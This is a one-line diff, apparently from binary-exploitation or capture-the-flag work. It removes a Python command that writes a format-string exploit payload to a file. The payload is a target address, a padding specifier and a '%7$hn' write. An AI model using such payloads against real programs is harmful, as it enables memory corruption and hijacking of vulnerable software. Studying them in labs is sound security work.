@@ -1,1 +1,0 @@
-python -c 'print "\x80\x9c\x04\x08"+"%34915p"+"%7$hn"' > of.txt
